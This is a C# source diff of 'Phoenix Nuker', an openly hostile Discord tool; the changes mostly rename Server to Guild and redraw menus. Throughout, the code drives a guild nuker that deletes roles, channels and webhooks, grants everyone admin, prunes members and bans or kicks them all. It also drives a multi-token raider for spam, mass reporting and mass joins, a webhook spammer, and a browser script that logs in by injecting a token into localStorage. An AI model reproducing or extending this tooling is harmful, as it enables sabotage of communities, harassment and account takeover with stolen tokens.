@@ -18,7 +18,7 @@ namespace Phoenix
     {
         #region Configuration
         static string? token;
-        static readonly List<string> clients = new List<string>();
+        static readonly List<string> tokenlist = new();
         static ulong? guildid;
 
         static void GetConfig()
@@ -64,10 +64,7 @@ namespace Phoenix
         #region Done Method
         enum Method
         {
-            Account = 0,
-            Server = 1,
-            Options = 2,
-            Raider = 3
+            Account = 0, Guild = 1, Options = 2, Raider = 3
         }
 
         static void DoneMethod(Method option)
@@ -79,11 +76,11 @@ namespace Phoenix
                 Thread.Sleep(2000);
                 AccountNuker();
             }
-            else if (option == Method.Server)
+            else if (option == Method.Guild)
             {
                 Console.WriteLine("Done");
                 Thread.Sleep(2000);
-                ServerNuker();
+                GuildNuker();
             }
             else if (option == Method.Options)
             {
@@ -131,11 +128,11 @@ namespace Phoenix
             try
             {
                 WriteLogo();
-                string options2 = @"╔════════════════════════╗
-║ [01] Login             ║
-║ [02] MultiToken Raider ║
-║ [03] Exit              ║
-╚════════════════════════╝
+                string options2 = @"╔══╦═══════════════════╗
+║01║ Login             ║
+║02║ MultiToken Raider ║
+║03║ Exit              ║
+╚══╩═══════════════════╝
 
 ";
                 Console.WriteWithGradient(options2, Color.OrangeRed, Color.Yellow, 7);
@@ -173,7 +170,7 @@ namespace Phoenix
                         foreach (var token in list)
                         {
                             count++;
-                            clients.Add(token);
+                            tokenlist.Add(token);
                         }
                         if (count == 0)
                         {
@@ -226,13 +223,13 @@ namespace Phoenix
                 WriteLogo();
                 Console.Title = $"Phoenix Nuker | {User.GetUsername(token)}";
 
-                string options = @"╔═════════════════════════════════════════════════╗
-║ [01] Account Nuker   [06] Login To Account      ║
-║ [02] Server Nuker    [07] Export Data           ║
-║ [03] Webhook Spammer [08] Enter Another Account ║
-║ [04] Delete Webhook  [09] Go Back               ║
-║ [05] Report Bot      [10] Exit                  ║
-╚═════════════════════════════════════════════════╝
+                string options = @"╔══╦═════════════════╦══╦═══════════════════════╗
+║01║ Account Nuker   ║06║ Login To Account      ║
+║02║ Guild Nuker     ║07║ Export Data           ║
+║03║ Webhook Spammer ║08║ Enter Another Account ║
+║04║ Delete Webhook  ║09║ Go Back               ║
+║05║ Report Bot      ║10║ Exit                  ║
+╚══╩═════════════════╩══╩═══════════════════════╝
 
 ";
                 Console.WriteWithGradient(options, Color.OrangeRed, Color.Yellow, 7);
@@ -257,16 +254,16 @@ namespace Phoenix
                             ulong? GuildID = ulong.Parse(Console.ReadLine());
                             guildid = GuildID;
                         }
-                        if (Server.GetServerName(token, guildid) == "N/A")
+                        if (Guild.GetGuildName(token, guildid) == "N/A")
                         {
                             WriteLogo();
-                            Console.WriteLine("Invalid ID or you're not in the server.");
+                            Console.WriteLine("Invalid ID or you're not in the guild.");
                             guildid = ulong.Parse("");
                             Thread.Sleep(3000);
                             Options();
                         }
-                        Console.Title = $"Phoenix Nuker | {User.GetUsername(token)} | {Server.GetServerName(token, guildid)}";
-                        ServerNuker();
+                        Console.Title = $"Phoenix Nuker | {User.GetUsername(token)} | {Guild.GetGuildName(token, guildid)}";
+                        GuildNuker();
                         break;
                     case 3:
                         WriteLogo();
@@ -286,7 +283,7 @@ namespace Phoenix
                         for (int i = 0; i < mcount; i++)
                         {
                             total++;
-                            Server.SendWebhookMessage(token, wid, wtoken, message);
+                            Guild.SendWebhookMessage(token, wid, wtoken, message);
                             Console.WriteLine("Messages sent: " + total);
                         }
                         DoneMethod(Method.Options);
@@ -296,7 +293,7 @@ namespace Phoenix
                         Console.Write("Webhook URL/ID: ");
                         ulong? wid2 = ulong.Parse(Console.ReadLine());
                         WriteLogo();
-                        Server.DeleteWebhook(token, wid2);
+                        Guild.DeleteWebhook(token, wid2);
                         Console.WriteLine("Done");
                         DoneMethod(Method.Options);
                         break;
@@ -311,13 +308,13 @@ namespace Phoenix
                         Console.Write("Message ID: ");
                         ulong? mid = ulong.Parse(Console.ReadLine());
                         WriteLogo();
-                        string options2 = @"╔═════════════════════════════╗
-║ [01] Illegal Content        ║
-║ [02] Harrassment            ║
-║ [03] Spam Or Phishing Links ║
-║ [04] Self Harm              ║
-║ [05] NSFW                   ║
-╚═════════════════════════════╝
+                        string options2 = @"╔══╦════════════════════════╗
+║01║ Illegal Content        ║
+║02║ Harrassment            ║
+║03║ Spam Or Phishing Links ║
+║04║ Self Harm              ║
+║05║ NSFW                   ║
+╚══╩════════════════════════╝
 
 ";
                         Console.WriteWithGradient(options2, Color.OrangeRed, Color.Yellow, 3);
@@ -331,7 +328,7 @@ namespace Phoenix
                         int reports = 0;
                         for (int i = 0; i < count; i++)
                         {
-                            Server.ReportMessage(token, gid, cid, mid, reason);
+                            Guild.ReportMessage(token, gid, cid, mid, reason);
                             reports++;
                             Console.WriteLine("Reports sent: " + reports);
                         }
@@ -344,28 +341,32 @@ namespace Phoenix
                         break;
                     case 7:
                         WriteLogo();
-                        string options3 = @"╔═════════════════════╗
-║ [01] Export Account ║
-║ [02] Export Server  ║
-╚═════════════════════╝
+                        string options3 = @"╔══╦════════════════╗
+║01║ Export Account ║
+║02║ Export Guild   ║
+╚══╩════════════════╝
 
 ";
                         Console.WriteWithGradient(options3, Color.OrangeRed, Color.Yellow, 3);
                         Console.ForegroundColor = Color.Yellow;
                         Console.Write("Your choice: ");
                         int choice = int.Parse(Console.ReadLine());
-                        if (choice == 1)
+                        switch (choice)
                         {
-                            WriteLogo();
-                            User.ExportAccount(token);
-                        }
-                        else if (choice == 2)
-                        {
-                            WriteLogo();
-                            Console.Write("Guild ID: ");
-                            ulong? gid2 = ulong.Parse(Console.ReadLine());
-                            WriteLogo();
-                            Server.ExportServer(token, gid2);
+                            default:
+                                Options();
+                                break;
+                            case 1:
+                                WriteLogo();
+                                User.ExportAccount(token);
+                                break;
+                            case 2:
+                                WriteLogo();
+                                Console.Write("Guild ID: ");
+                                ulong? gid2 = ulong.Parse(Console.ReadLine());
+                                WriteLogo();
+                                Guild.ExportGuild(token, gid2);
+                                break;
                         }
                         DoneMethod(Method.Options);
                         break;
@@ -428,8 +429,10 @@ namespace Phoenix
                 options.AddArguments("--disable-infobars");
                 options.AddArgument("--silent");
 
-                IWebDriver driver = new ChromeDriver(service, options);
-                driver.Url = "https://discord.com/login";
+                IWebDriver driver = new ChromeDriver(service, options)
+                {
+                    Url = "https://discord.com/login"
+                };
 
                 IJavaScriptExecutor execute = (IJavaScriptExecutor)driver;
                 execute.ExecuteScript($"let token = \"{token}\"; function login(token) {{ setInterval(() => {{ document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `\"${{token}}\"` }}, 50); setTimeout(() => {{ location.reload(); }}, 2500); }} login(token);");
@@ -449,13 +452,13 @@ namespace Phoenix
             try
             {
                 WriteLogo();
-                string options = @"╔═════════════════════════════════════════════════════════════╗
-║ [01] Join Guild/Group [06] Block User     [11] Check Tokens ║
-║ [02] Leave Guild      [07] DM User        [12] Go Back      ║
-║ [03] Add Friend       [08] Leave Group    [13] Exit         ║
-║ [04] Spam             [09] Trigger Typing                   ║
-║ [05] Add Reaction     [10] Report Message                   ║
-╚═════════════════════════════════════════════════════════════╝
+                string options = @"╔══╦══════════════════╦══╦════════════════╦══╦══════════════╗
+║01║ Join Guild/Group ║06║ Block User     ║11║ Check Tokens ║
+║02║ Leave Guild      ║07║ DM User        ║12║ Go Back      ║
+║03║ Add Friend       ║08║ Leave Group    ║13║ Exit         ║
+║04║ Spam             ║09║ Trigger Typing ║14║              ║
+║05║ Add Reaction     ║10║ Report Message ║15║              ║
+╚══╩══════════════════╩══╩════════════════╩══╩══════════════╝
 
 ";
                 Console.WriteWithGradient(options, Color.OrangeRed, Color.Yellow, 7);
@@ -478,7 +481,7 @@ namespace Phoenix
                         if (code.Contains("https://discord.com/invite/"))
                             code = code.Replace("https://discord.com/invite/", "");
                         WriteLogo();
-                        foreach (var joinguild in clients)
+                        foreach (var joinguild in tokenlist)
                             Raid.JoinGuild(joinguild, code);
                         DoneMethod(Method.Raider);
                         break;
@@ -487,7 +490,7 @@ namespace Phoenix
                         Console.Write("Guild ID: ");
                         ulong? id = ulong.Parse(Console.ReadLine());
                         WriteLogo();
-                        foreach (var token in clients)
+                        foreach (var token in tokenlist)
                             Raid.LeaveGuild(token, id);
                         DoneMethod(Method.Raider);
                         break;
@@ -498,7 +501,7 @@ namespace Phoenix
                         string user = full.Split('#')[0];
                         uint discriminator = uint.Parse(full.Split('#')[1]);
                         WriteLogo();
-                        foreach (var token in clients)
+                        foreach (var token in tokenlist)
                             Raid.AddFriend(token, user, discriminator);
                         DoneMethod(Method.Raider);
                         break;
@@ -515,7 +518,7 @@ namespace Phoenix
                         WriteLogo();
                         for (int i = 0; i < count; i++)
                         {
-                            foreach (var token in clients)
+                            foreach (var token in tokenlist)
                                 Raid.SendMessage(token, cid, msg);
                         }
                         DoneMethod(Method.Raider);
@@ -528,69 +531,64 @@ namespace Phoenix
                         Console.Write("Message ID: ");
                         ulong? mid = ulong.Parse(Console.ReadLine());
                         WriteLogo();
-                        string options2 = @"╔════════════════════════════════════════════════════════════╗
-║ [01] Heart                [06] Billed Cap                  ║
-║ [02] White Check Mark     [07] Negative Squared Cross Mark ║
-║ [03] Regional Indicator L [08] Neutral Face                ║
-║ [04] Regional Indicator W [09] Nerd Face                   ║
-║ [05] Middle Finger        [10] Joy                         ║
-╚════════════════════════════════════════════════════════════╝
+                        string options2 = @"╔══╦══════════════════════╦══╦═════════════════════════════╗
+║01║ Heart                ║06║ Billed Cap                  ║
+║02║ White Check Mark     ║07║ Negative Squared Cross Mark ║
+║03║ Regional Indicator L ║08║ Neutral Face                ║
+║04║ Regional Indicator W ║09║ Nerd Face                   ║
+║05║ Middle Finger        ║10║ Joy                         ║
+╚══╩══════════════════════╩══╩═════════════════════════════╝
 
 ";
                         Console.WriteWithGradient(options2, Color.OrangeRed, Color.Yellow, 7);
                         Console.ForegroundColor = Color.Yellow;
                         Console.Write("Your choice: ");
-                        string choice = Console.ReadLine();
-                        WriteLogo();
-                        if (choice == "1")
+                        int choice = int.Parse(Console.ReadLine());
+                        switch (choice)
                         {
-                            foreach (var token in clients)
-                                Raid.AddReaction(token, cid2, mid, "❤️");
-                        }
-                        if (choice == "2")
-                        {
-                            foreach (var token in clients)
-                                Raid.AddReaction(token, cid2, mid, "✅");
-                        }
-                        if (choice == "3")
-                        {
-                            foreach (var token in clients)
-                                Raid.AddReaction(token, cid2, mid, "🇱");
-                        }
-                        if (choice == "4")
-                        {
-                            foreach (var token in clients)
-                                Raid.AddReaction(token, cid2, mid, "🇼");
-                        }
-                        if (choice == "5")
-                        {
-                            foreach (var token in clients)
-                                Raid.AddReaction(token, cid2, mid, "🖕");
-                        }
-                        if (choice == "6")
-                        {
-                            foreach (var token in clients)
-                                Raid.AddReaction(token, cid2, mid, "🧢");
-                        }
-                        if (choice == "7")
-                        {
-                            foreach (var token in clients)
-                                Raid.AddReaction(token, cid2, mid, "❎");
-                        }
-                        if (choice == "8")
-                        {
-                            foreach (var token in clients)
-                                Raid.AddReaction(token, cid2, mid, "😐");
-                        }
-                        if (choice == "9")
-                        {
-                            foreach (var token in clients)
-                                Raid.AddReaction(token, cid2, mid, "🤓");
-                        }
-                        if (choice == "10")
-                        {
-                            foreach (var token in clients)
-                                Raid.AddReaction(token, cid2, mid, "😂");
+                            default:
+                                Raider();
+                                break;
+                            case 1:
+                                foreach (var token in tokenlist)
+                                    Raid.AddReaction(token, cid2, mid, "❤️");
+                                break;
+                            case 2:
+                                foreach (var token in tokenlist)
+                                    Raid.AddReaction(token, cid2, mid, "✅");
+                                break;
+                            case 3:
+                                foreach (var token in tokenlist)
+                                    Raid.AddReaction(token, cid2, mid, "🇱");
+                                break;
+                            case 4:
+                                foreach (var token in tokenlist)
+                                    Raid.AddReaction(token, cid2, mid, "🇼");
+                                break;
+                            case 5:
+                                foreach (var token in tokenlist)
+                                    Raid.AddReaction(token, cid2, mid, "🖕");
+                                break;
+                            case 6:
+                                foreach (var token in tokenlist)
+                                    Raid.AddReaction(token, cid2, mid, "🧢");
+                                break;
+                            case 7:
+                                foreach (var token in tokenlist)
+                                    Raid.AddReaction(token, cid2, mid, "❎");
+                                break;
+                            case 8:
+                                foreach (var token in tokenlist)
+                                    Raid.AddReaction(token, cid2, mid, "😐");
+                                break;
+                            case 9:
+                                foreach (var token in tokenlist)
+                                    Raid.AddReaction(token, cid2, mid, "🤓");
+                                break;
+                            case 10:
+                                foreach (var token in tokenlist)
+                                    Raid.AddReaction(token, cid2, mid, "😂");
+                                break;
                         }
                         DoneMethod(Method.Raider);
                         break;
@@ -599,7 +597,7 @@ namespace Phoenix
                         Console.Write("User ID: ");
                         ulong? uid2 = ulong.Parse(Console.ReadLine());
                         WriteLogo();
-                        foreach (var token in clients)
+                        foreach (var token in tokenlist)
                             Raid.BlockUser(token, uid2);
                         DoneMethod(Method.Raider);
                         break;
@@ -611,7 +609,7 @@ namespace Phoenix
                         Console.Write("Message: ");
                         string msg2 = Console.ReadLine();
                         WriteLogo();
-                        foreach (var token in clients)
+                        foreach (var token in tokenlist)
                             Raid.DMUser(token, uid, msg2);
                         DoneMethod(Method.Raider);
                         break;
@@ -620,7 +618,7 @@ namespace Phoenix
                         Console.Write("Group ID: ");
                         ulong? gid = ulong.Parse(Console.ReadLine());
                         WriteLogo();
-                        foreach (var token in clients)
+                        foreach (var token in tokenlist)
                             Raid.LeaveGroup(token, gid);
                         DoneMethod(Method.Raider);
                         break;
@@ -629,7 +627,7 @@ namespace Phoenix
                         Console.Write("Channel ID: ");
                         ulong? cid4 = ulong.Parse(Console.ReadLine());
                         WriteLogo();
-                        foreach (var token in clients)
+                        foreach (var token in tokenlist)
                             Raid.TriggerTyping(token, cid4);
                         DoneMethod(Method.Raider);
                         break;
@@ -644,13 +642,13 @@ namespace Phoenix
                         Console.Write("Message ID: ");
                         ulong? mid2 = ulong.Parse(Console.ReadLine());
                         WriteLogo();
-                        string options3 = @"╔═════════════════════════════╗
-║ [01] Illegal Content        ║
-║ [02] Harrassment            ║
-║ [03] Spam Or Phishing Links ║
-║ [04] Self Harm              ║
-║ [05] NSFW                   ║
-╚═════════════════════════════╝
+                        string options3 = @"╔══╦════════════════════════╗
+║01║ Illegal Content        ║
+║02║ Harrassment            ║
+║03║ Spam Or Phishing Links ║
+║04║ Self Harm              ║
+║05║ NSFW                   ║
+╚══╩════════════════════════╝
 
 ";
                         Console.WriteWithGradient(options3, Color.OrangeRed, Color.Yellow, 3);
@@ -658,14 +656,14 @@ namespace Phoenix
                         Console.Write("Your choice: ");
                         int reason = int.Parse(Console.ReadLine());
                         WriteLogo();
-                        foreach (var token in clients)
+                        foreach (var token in tokenlist)
                             Raid.ReportMessage(token, gid2, cid3, mid2, reason);
                         DoneMethod(Method.Raider);
                         break;
                     case 11:
                         WriteLogo();
                         Console.ReplaceAllColorsWithDefaults();
-                        foreach (var token in clients)
+                        foreach (var token in tokenlist)
                         {
                             try
                             {
@@ -703,14 +701,14 @@ namespace Phoenix
             try
             {
                 WriteLogo();
-                string options2 = @"╔═══════════════════════════════════════════════════════════════════╗
-║ [01] Edit Profile        [07] Mass Create Guilds  [13] Delete DMs ║
-║ [02] Leave/Delete Guilds [08] Seizure Mode        [14] Go Back    ║
-║ [03] Clear Relationships [09] Confuse Mode        [15] Exit       ║
-║ [04] Leave HypeSquad     [10] Mass DM                             ║
-║ [05] Remove Connections  [11] User Info                           ║
-║ [06] Deauthorize Apps    [12] Block Relationships                 ║
-╚═══════════════════════════════════════════════════════════════════╝
+                string options2 = @"╔══╦═════════════════════╦══╦═════════════════════╦══╦════════════╗
+║01║ Edit Profile        ║07║ Mass Create Guilds  ║13║ Delete DMs ║
+║02║ Leave/Delete Guilds ║08║ Seizure Mode        ║14║ Go Back    ║
+║03║ Clear Relationships ║09║ Confuse Mode        ║15║ Exit       ║
+║04║ Leave HypeSquad     ║10║ Mass DM             ║16║            ║
+║05║ Remove Connections  ║11║ User Info           ║17║            ║
+║06║ Deauthorize Apps    ║12║ Block Relationships ║18║            ║
+╚══╩═════════════════════╩══╩═════════════════════╩══╩════════════╝
 
 ";
                 Console.WriteWithGradient(options2, Color.OrangeRed, Color.Yellow, 7);
@@ -726,12 +724,12 @@ namespace Phoenix
                         break;
                     case 1:
                         WriteLogo();
-                        string options3 = @"╔═════════════════╗
-║ [00] None       ║
-║ [01] Bravery    ║
-║ [02] Brilliance ║
-║ [03] Balance    ║
-╚═════════════════╝
+                        string options3 = @"╔══╦════════════╗
+║00║ None       ║
+║01║ Bravery    ║
+║02║ Brilliance ║
+║03║ Balance    ║
+╚══╩════════════╝
 
 ";
                         Console.WriteWithGradient(options3, Color.OrangeRed, Color.Yellow, 7);
@@ -851,33 +849,33 @@ namespace Phoenix
         }
         #endregion
 
-        #region Server Nuker
-        static void ServerNuker()
+        #region Guild Nuker
+        static void GuildNuker()
         {
             try
             {
                 WriteLogo();
-                string options = @"╔════════════════════════════════════════════════════════════════════════════════════════════════╗
-║ [01] Delete Roles         [09] Remove Integrations          [17] Mass Create Invites           ║
-║ [02] Remove All Bans      [10] Remove All Reactions         [18] Delete Guild Scheduled Events ║
-║ [03] Delete All Channels  [11] Server Info                  [19] Delete Guild Template         ║
-║ [04] Delete All Emojis    [12] Leave/Delete Server          [20] Delete Stage Instances        ║
-║ [05] Delete All Invites   [13] Msg In Every Channel         [21] Delete Webhooks               ║
-║ [06] Mass Create Roles    [14] Delete Stickers              [22] Switch To Other Server        ║
-║ [07] Mass Create Channels [15] Grant Everyone Admin         [23] Go Back                       ║
-║ [08] Prune Members        [16] Delete Auto Moderation Rules [24] Exit                          ║
-╚════════════════════════════════════════════════════════════════════════════════════════════════╝
+                string options = @"╔══╦══════════════════════╦══╦══════════════════════════════╦══╦═══════════════════════════════╗
+║01║ Delete Roles         ║09║ Remove Integrations          ║17║ Mass Create Invites           ║
+║02║ Remove All Bans      ║10║ Remove All Reactions         ║18║ Delete Guild Scheduled Events ║
+║03║ Delete All Channels  ║11║ Guild Info                   ║19║ Delete Guild Template         ║
+║04║ Delete All Emojis    ║12║ Leave/Delete Guild           ║20║ Delete Stage Instances        ║
+║05║ Delete All Invites   ║13║ Msg In Every Channel         ║21║ Delete Webhooks               ║
+║06║ Mass Create Roles    ║14║ Delete Stickers              ║22║ Switch To Other Guild         ║
+║07║ Mass Create Channels ║15║ Grant Everyone Admin         ║23║ Go Back                       ║
+║08║ Prune Members        ║16║ Delete Auto Moderation Rules ║24║ Exit                          ║
+╚══╩══════════════════════╩══╩══════════════════════════════╩══╩═══════════════════════════════╝
 
 ";
                 Console.WriteWithGradient(options, Color.OrangeRed, Color.Yellow, 7);
 
                 if (Config.IsBot == true)
                 {
-                    string options2 = @"╔═══════════════════════╗
-║ [25] Ban All Members  ║
-║ [26] Kick All Members ║
-║ [27] Rename Everyone  ║
-╚═══════════════════════╝
+                    string options2 = @"╔══╦══════════════════╗
+║25║ Ban All Members  ║
+║26║ Kick All Members ║
+║27║ Rename Everyone  ║
+╚══╩══════════════════╝
 
 ";
                     Console.WriteWithGradient(options2, Color.OrangeRed, Color.Yellow, 7);
@@ -891,32 +889,32 @@ namespace Phoenix
                     default:
                         Console.WriteLine("Not a valid option.");
                         Thread.Sleep(3000);
-                        ServerNuker();
+                        GuildNuker();
                         break;
                     case 1:
                         WriteLogo();
-                        Server.DeleteRoles(token, guildid);
-                        DoneMethod(Method.Server);
+                        Guild.DeleteRoles(token, guildid);
+                        DoneMethod(Method.Guild);
                         break;
                     case 2:
                         WriteLogo();
-                        Server.RemoveBans(token, guildid);
-                        DoneMethod(Method.Server);
+                        Guild.RemoveBans(token, guildid);
+                        DoneMethod(Method.Guild);
                         break;
                     case 3:
                         WriteLogo();
-                        Server.DeleteChannels(token, guildid);
-                        DoneMethod(Method.Server);
+                        Guild.DeleteChannels(token, guildid);
+                        DoneMethod(Method.Guild);
                         break;
                     case 4:
                         WriteLogo();
-                        Server.DeleteEmojis(token, guildid);
-                        DoneMethod(Method.Server);
+                        Guild.DeleteEmojis(token, guildid);
+                        DoneMethod(Method.Guild);
                         break;
                     case 5:
                         WriteLogo();
-                        Server.DeleteInvites(token, guildid);
-                        DoneMethod(Method.Server);
+                        Guild.DeleteInvites(token, guildid);
+                        DoneMethod(Method.Guild);
                         break;
                     case 6:
                         WriteLogo();
@@ -930,10 +928,10 @@ namespace Phoenix
                         for (int i = 0; i < count; i++)
                         {
                             numb++;
-                            Server.CreateRole(token, guildid, name);
+                            Guild.CreateRole(token, guildid, name);
                             Console.WriteLine("Created: " + numb, Color.Lime);
                         }
-                        DoneMethod(Method.Server);
+                        DoneMethod(Method.Guild);
                         break;
                     case 7:
                         WriteLogo();
@@ -947,20 +945,20 @@ namespace Phoenix
                         for (int i = 0; i < count2; i++)
                         {
                             numb2++;
-                            Server.CreateChannel(token, guildid, name2);
+                            Guild.CreateChannel(token, guildid, name2);
                             Console.WriteLine("Created: " + numb2, Color.Lime);
                         }
-                        DoneMethod(Method.Server);
+                        DoneMethod(Method.Guild);
                         break;
                     case 8:
                         WriteLogo();
-                        Server.PruneMembers(token, guildid);
-                        DoneMethod(Method.Server);
+                        Guild.PruneMembers(token, guildid);
+                        DoneMethod(Method.Guild);
                         break;
                     case 9:
                         WriteLogo();
-                        Server.RemoveIntegrations(token, guildid);
-                        DoneMethod(Method.Server);
+                        Guild.RemoveIntegrations(token, guildid);
+                        DoneMethod(Method.Guild);
                         break;
                     case 10:
                         WriteLogo();
@@ -970,25 +968,25 @@ namespace Phoenix
                         Console.Write("Message ID: ");
                         ulong? mid = ulong.Parse(Console.ReadLine());
                         WriteLogo();
-                        Server.DeleteAllReactions(token, cid, mid);
-                        DoneMethod(Method.Server);
+                        Guild.DeleteAllReactions(token, cid, mid);
+                        DoneMethod(Method.Guild);
                         break;
                     case 11:
                         WriteLogo();
-                        Server.ServerInformation(token, guildid);
-                        ServerNuker();
+                        Guild.GuildInformation(token, guildid);
+                        GuildNuker();
                         break;
                     case 12:
                         WriteLogo();
-                        Server.LeaveDeleteGuild(token, guildid);
-                        DoneMethod(Method.Server);
+                        Guild.LeaveDeleteGuild(token, guildid);
+                        DoneMethod(Method.Guild);
                         break;
                     case 13:
                         WriteLogo();
-                        string options3 = @"╔══════════════════╗
-║ [01] Spam        ║
-║ [02] One Message ║
-╚══════════════════╝
+                        string options3 = @"╔══╦═════════════╗
+║01║ Spam        ║
+║02║ One Message ║
+╚══╩═════════════╝
 
 ";
                         Console.WriteWithGradient(options3, Color.OrangeRed, Color.Yellow, 7);
@@ -1005,7 +1003,7 @@ namespace Phoenix
                             int count3 = int.Parse(Console.ReadLine());
                             WriteLogo();
                             for (int i = 0; i < count3; i++)
-                                Server.MsgInEveryChannel(token, guildid, msg);
+                                Guild.MsgInEveryChannel(token, guildid, msg);
                         }
                         else
                         {
@@ -1013,49 +1011,49 @@ namespace Phoenix
                             Console.Write("Message: ");
                             string msg = Console.ReadLine();
                             WriteLogo();
-                            Server.MsgInEveryChannel(token, guildid, msg);
+                            Guild.MsgInEveryChannel(token, guildid, msg);
                         }
-                        DoneMethod(Method.Server);
+                        DoneMethod(Method.Guild);
                         break;
                     case 14:
                         WriteLogo();
-                        Server.DeleteStickers(token, guildid);
-                        DoneMethod(Method.Server);
+                        Guild.DeleteStickers(token, guildid);
+                        DoneMethod(Method.Guild);
                         break;
                     case 15:
                         WriteLogo();
-                        Server.GrantEveryoneAdmin(token, guildid);
-                        DoneMethod(Method.Server);
+                        Guild.GrantEveryoneAdmin(token, guildid);
+                        DoneMethod(Method.Guild);
                         break;
                     case 16:
                         WriteLogo();
-                        Server.DeleteAutoModerationRules(token, guildid);
-                        DoneMethod(Method.Server);
+                        Guild.DeleteAutoModerationRules(token, guildid);
+                        DoneMethod(Method.Guild);
                         break;
                     case 17:
                         WriteLogo();
-                        Server.CreateInvite(token, guildid);
-                        DoneMethod(Method.Server);
+                        Guild.CreateInvite(token, guildid);
+                        DoneMethod(Method.Guild);
                         break;
                     case 18:
                         WriteLogo();
-                        Server.DeleteGuildScheduledEvents(token, guildid);
-                        DoneMethod(Method.Server);
+                        Guild.DeleteGuildScheduledEvents(token, guildid);
+                        DoneMethod(Method.Guild);
                         break;
                     case 19:
                         WriteLogo();
-                        Server.DeleteGuildTemplate(token, guildid);
-                        DoneMethod(Method.Server);
+                        Guild.DeleteGuildTemplate(token, guildid);
+                        DoneMethod(Method.Guild);
                         break;
                     case 20:
                         WriteLogo();
-                        Server.DeleteStageInstances(token, guildid);
-                        DoneMethod(Method.Server);
+                        Guild.DeleteStageInstances(token, guildid);
+                        DoneMethod(Method.Guild);
                         break;
                     case 21:
                         WriteLogo();
-                        Server.DeleteWebhooks(token, guildid);
-                        DoneMethod(Method.Server);
+                        Guild.DeleteWebhooks(token, guildid);
+                        DoneMethod(Method.Guild);
                         break;
                     case 22:
                         WriteLogo();
@@ -1065,16 +1063,16 @@ namespace Phoenix
                             ulong? GuildID = ulong.Parse(Console.ReadLine());
                             guildid = GuildID;
                         }
-                        if (Server.GetServerName(token, guildid) == "N/A")
+                        if (Guild.GetGuildName(token, guildid) == "N/A")
                         {
                             WriteLogo();
-                            Console.WriteLine("Invalid ID or you're not in the server.");
+                            Console.WriteLine("Invalid ID or you're not in the guild.");
                             guildid = ulong.Parse("");
                             Thread.Sleep(3000);
                             Options();
                         }
-                        Console.Title = $"Phoenix Nuker | {User.GetUsername(token)} | {Server.GetServerName(token, guildid)}";
-                        ServerNuker();
+                        Console.Title = $"Phoenix Nuker | {User.GetUsername(token)} | {Guild.GetGuildName(token, guildid)}";
+                        GuildNuker();
                         break;
                     case 23:
                         WriteLogo();
@@ -1086,12 +1084,12 @@ namespace Phoenix
                     case 25:
                         WriteLogo();
                         Bot.BanAllMembers(token, guildid);
-                        DoneMethod(Method.Server);
+                        DoneMethod(Method.Guild);
                         break;
                     case 26:
                         WriteLogo();
                         Bot.KickAllMembers(token, guildid);
-                        DoneMethod(Method.Server);
+                        DoneMethod(Method.Guild);
                         break;
                     case 27:
                         WriteLogo();
@@ -1099,7 +1097,7 @@ namespace Phoenix
                         string nick = Console.ReadLine();
                         WriteLogo();
                         Bot.ChangeAllNicknames(token, guildid, nick);
-                        DoneMethod(Method.Server);
+                        DoneMethod(Method.Guild);
                         break;
                 }
             }
@@ -1107,7 +1105,7 @@ namespace Phoenix
             {
                 Console.WriteLine(e.Message);
                 Thread.Sleep(3000);
-                ServerNuker();
+                GuildNuker();
             }
         }
         #endregion
